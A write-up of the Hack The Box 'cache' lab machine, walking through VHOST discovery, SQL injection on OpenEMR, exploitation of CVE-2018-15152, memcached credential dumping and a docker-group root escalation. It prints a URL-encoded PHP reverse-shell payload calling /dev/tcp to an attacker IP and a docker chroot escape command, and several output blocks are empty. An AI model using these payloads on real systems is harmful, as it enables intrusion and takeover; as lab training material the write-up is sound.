Cache is a medium difficulty box but it includes numerous techniques such as docker privilege escalation, VHOST enumeration and memcached exploit. 

<!--more-->

## HTB - cache
**Box** : cache\
**IP Address** : 10.10.10.188\
**Operating System** : Linux

## Remarks

- I was unaware of VHOST enumeration at the beginning and wasted a lot of time trying to bruteforce directories for the website
- Research on memcache exploits before starting this box!

## Enumeration
As with every other machine, we will start off by doing a Nmap scan on the IP address. For this machine, there is nothing special that can be discovered from the Nmap scan except for the fact that we have a web service running on port 80.

## Discovery

To start off, let's first add the IP address to our ```/etc/hosts``` file

```
10.10.10.188    cache.htb 
```
We will now try to enumerate the endpoints on ```http://cache.htb``` using Gobuster. From the results, we were able to discover a ```jquery``` endpoint that may contain possible jquery code that could be exploited.

http://10.10.10.188/server-status        (Status: 403) [Size: 277] 
```

Visiting the ```/jquery``` endpoint, we found a ```functionality.js``` file that reveals the authentication algorithm for the website. From the code, we know that the username of ```ash``` and the password of ```H@v3_fun``` allows us to be authenticated.

![functionality.js](../assets/cache/functionality_js.png)

However, after logging into the website, we were unable to find any possible attack vectors. All we can see is a page showing that the site is still under construction. Upon furthur exploration of the page, we discover a ```/author.html``` endpoint that tells us that the author is also involved in another project (Hospital Management Project(HMS)). So, we will try to add the following to our ```/etc/hosts``` file to see if there is another site that can be accessed.

```
10.10.10.188    cache.htb hms.htb hms.cache.htb cache.hms.htb
```

Now, we will do a scan with Nikto on ```http://hms.htb``` to uncover potential vulnerabilites. The scan picked up a publicly-accessible ```admin.php``` page that reveals sensitive information about the webpage. 

![admin.php page](../assets/cache/admin_php.png)

## Exploit 

From the discovery process, we noticed that OpenEmr is being used and research on OpenEmr leads us to CVE-2018-15152. Before we use the exploit, we will first have to look for the credential information that allows us to login to the website. Navigating to ```/portal/add_edit_events_user.php```, we realize that this page is vulnerable to SQL injection.

Using SQLMap, we were able to get the vulnerable site to dump out an ecnrypted password for the user ```openemr_admin```

```

Afterwards, we were able to successfully crack the password using John The Ripper, and the password was revealed to be xxxxxx

```

Now, we will make use of the CVE mentioned earlier to trigger an arbitary PHP code execution from ```/portal/import_template```. All we have to do is to craft a single-line url-encoded PHP paylod, ```%3C%3Fphp%0A%0Aexec(%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.250%2F3001%200%3E%261%27%22)%3B```, which uploads a reverse shell to the vulnerable endpoint. We will then visit ```/portal/exploit.php``` to trigger the payload.

![PHP rce](../assets/cache/rce_reverse_shell.png)

Next, all that is left for us to do is to stabilize the reverse shell.

```

```

## Low-level privilege escalation

However, we realize that we are now ```www-data``` and does not have sufficient privileges to read the user flag.

```
www-data@cache:/$ cd /home/ash
cd /home/ash
www-data@cache:/home/ash$ ls
ls
Desktop  Documents  Downloads  Music  Pictures  Public  user.txt
www-data@cache:/home/ash$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@cache:/home/ash$ 
```

Recalling that we have obtained the credentials for ```ash``` previously, we will now try to login as ```ash``` and read the flag. 

```
www-data@cache:/home/ash$ su ash
su ash
Password: H@v3_fun

ash@cache:~$ cat user.txt
cat user.txt
<Redacted user flag>
ash@cache:~$
```

## High-level privilege escalation
First, we will check if the user ```ash``` has sudo privileges, and it seems that ```ash``` does not have the sufficient privileges to execute ```sudo``` commands.

```
ash@cache:~$ sudo -l
sudo -l
[sudo] password for ash: H@v3_fun

Sorry, user ash may not run sudo on cache.
```

Next, we will try to run the ```linpeas.sh``` script on the terminal. From the output, we were able to observe that ```apache2``` process stores credentials in memory. This gives us the idea that we could potentially use memcache exploits to extract the credentials of another privileged user. 

```

```

From the output of ```linpeas.sh```, we were also able to uncover another user ```luffy```. What is interesting about ```luffy``` is that this user is a member of the ```docker``` group. This furthue gives us an idea that we can leverage on docker to obtain root privileges.

```
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)
```

However, we will have to obtain the credentials of ```luffy``` first. To do that, we will first dump all the keys cached in the memory and from there, we will be able to obtain the password for ```luffy```

```
ash@cache:~$ telnet 127.0.0.1 11211
telnet 127.0.0.1 11211

END

```

Afterwards, we will su into ```luffy``, but we notice that this user is still unable to execute sudo command. Recalling that this user is part of the docker group. We will first check all the docker images and containers on the terminal. During the investigation, we realize that even though there is no running containers in the terminal, there is a ubuntu image that could be leveraged to obtain root privileges.

```
luffy@cache:~$ docker ps
docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
luffy@cache:~$ docker images
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE

```

Lastly, we will execute the ubuntu image and break out of the container to obtain root privileges. We can then obtain the system flag with the root privileges.

```
luffy@cache:~$ docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh                    
docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
